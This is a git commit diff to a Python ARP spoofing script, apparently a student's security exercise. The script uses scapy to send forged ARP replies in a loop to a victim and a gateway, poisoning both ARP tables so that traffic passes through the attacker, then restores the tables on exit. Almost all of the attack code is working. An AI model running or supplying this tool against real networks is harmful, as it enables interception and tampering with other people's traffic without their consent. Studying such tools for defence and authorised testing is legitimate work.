b78a62f38191b67af772b7b1e461da6314258a97
Noman Nasir Minhas <SP17-BSE-010@ISBSTUDENT.COMSATS.EDU.PK>
2023-01-02 01:20:46 +0500

    Loggin level set

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -25,32 +25,34 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 
-def spoof_arp_table(victim_ip, false_requester_ip):
-    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip),
+def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
+    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                   psrc=false_requester_ip)  # OP = 2 ARP response, 1 = ARP request,
     scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
 
 
-def restore_arp_table(victim_ip, false_requester_ip):
-    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip),
-                                  psrc=false_requester_ip, hwsrc=get_mac(false_requester_ip))
+def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester_mac):
+    target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
+                                  psrc=false_requester_ip, hwsrc=false_requester_mac)
     scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
 
 
 option = get_arguments()
-print("MAC of target: " + get_mac(option.target_ip))
-print("MAC of gateway: " + get_mac(option.gateway_ip))
+target_mac = get_mac(option.target_ip)
+gateway_mac = get_mac(option.gateway_ip)
+print("MAC of target: " + target_mac)
+print("MAC of gateway: " + gateway_mac)
 count = 0
 try:
     while True:
-        spoof_arp_table(option.target_ip, option.gateway_ip)
-        spoof_arp_table(option.gateway_ip, option.target_ip)
+        spoof_arp_table(option.target_ip, target_mac, option.gateway_ip)
+        spoof_arp_table(option.gateway_ip, gateway_mac, option.target_ip)
         count += 2
         print("\r[+] Packets sent: " + str(count), end="")
         time.sleep(1)
 
 except KeyboardInterrupt:
     print("[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
-    restore_arp_table(option.target_ip, option.gateway_ip)
-    restore_arp_table(option.gateway_ip, option.target_ip)
+    restore_arp_table(option.target_ip, target_mac, option.gateway_ip, gateway_mac)
+    restore_arp_table(option.gateway_ip, gateway_mac, option.target_ip, target_mac)
     print("[+] ARP Tables Reset Successfully")
